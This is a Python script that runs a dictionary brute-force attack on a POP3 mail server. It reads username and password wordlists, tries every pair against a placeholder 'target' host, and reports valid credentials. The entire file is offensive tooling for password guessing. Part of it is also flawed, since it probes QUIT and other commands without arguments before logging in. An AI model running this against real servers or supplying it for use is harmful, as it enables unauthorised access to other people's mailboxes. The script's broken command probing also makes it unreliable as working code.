import poplib
from socket import gaierror, timeout

# POP3 Server configuration
host = "example.com"  # Replace with your target POP3 server
port = 110  # Default POP3 port, use 995 for POP3 SSL

# Load usernames and passwords from files
def load_list_from_file(filename):
    try:
        with open(filename, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"File not found: {filename}")
        return []

# Define username and password lists from files
usernames = load_list_from_file("usernames.txt")
passwords = load_list_from_file("passwords.txt")

def test_pop3_commands(server):
    print("\n[+] Checking supported commands...")
    try:
        capabilities = server.capa()
        print("Supported capabilities (from CAPA):")
        for capability in capabilities:
            print(f" - {capability}")
    except poplib.error_proto:
        print("CAPA command not supported. Testing common POP3 commands individually...")

    # Test common POP3 commands
    common_commands = ["USER", "PASS", "STAT", "LIST", "RETR", "DELE", "NOOP", "RSET", "QUIT"]
    supported_commands = []
    
    for command in common_commands:
        try:
            response = server._shortcmd(command)
            print(f"{command}: Supported")
            supported_commands.append(command)
        except poplib.error_proto:
            print(f"{command}: Not supported")

    return supported_commands

def pop3_connect_and_enumerate(host, port, username, password):
    try:
        # Connect to the POP3 server
        server = poplib.POP3(host, port, timeout=5)
        print(f"\n[+] Connected to {host}")

        # Test commands
        supported_commands = test_pop3_commands(server)
        
        # Try authentication if USER and PASS commands are supported
        if "USER" in supported_commands and "PASS" in supported_commands:
            server.user(username)
            response = server.pass_(password)
            
            if "+OK" in response:
                print(f"[+] Valid credentials found: {username}:{password}")
            else:
                print(f"[-] Failed login for: {username}:{password}")
        else:
            print("[-] USER or PASS commands not supported; skipping login attempts.")
        
        server.quit()

    except (poplib.error_proto, gaierror, timeout) as e:
        print(f"Connection or protocol error for {username}:{password} - {str(e)}")
    except Exception as e:
        print(f"Unexpected error for {username}:{password} - {str(e)}")

# Run the command test and enumerate usernames/passwords
for username in usernames:
    for password in passwords:
        pop3_connect_and_enumerate(host, port, username, password)
